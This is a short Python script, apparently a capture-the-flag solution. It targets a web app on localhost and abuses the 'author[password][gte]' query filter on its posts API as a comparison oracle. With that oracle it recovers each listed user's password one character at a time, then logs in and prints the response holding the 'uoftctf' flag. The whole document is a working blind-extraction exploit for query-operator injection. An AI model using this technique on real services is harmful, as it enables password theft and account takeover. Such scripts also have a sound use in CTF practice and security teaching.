import requests

BASE_URL = "http://localhost:3000"
USERS = ["White", "Bob", "Tommy", "Sam"]
ALPH = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

def checkPass(user, password):
    res = requests.get(f'{BASE_URL}/api/posts?author[name]={user}&author[password][gte]={password}').json()
    if len(res['posts']) > 0:
        return True
    return False

def login(user, password):
    res = requests.post(f'{BASE_URL}/api/login', json={"name":user, "password":password}).json()
    if res["success"] == True:
        return True, res
    else: return False, None

# can make this more efficient with binseach
def getPosts(user):
    p = ""
    while True:
        found = False
        for ind, i in enumerate(ALPH):
            if not checkPass(user, p + i):
                found = True
                break
        if found:
            p += ALPH[ind-1]
        else:
            p += ALPH[-1]
        if len(p) >= 15 and (res := login(user, p))[0]:
            return res[1]

for user in USERS:
    res = str(getPosts(user))
    if "uoftctf" in res:
        print(res)
        break